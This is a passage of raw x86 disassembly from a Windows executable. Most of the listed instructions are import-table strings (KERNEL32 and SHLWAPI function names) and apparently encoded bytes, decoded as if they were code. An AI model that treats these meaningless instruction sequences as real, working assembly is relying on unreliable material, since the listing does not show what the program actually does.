  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
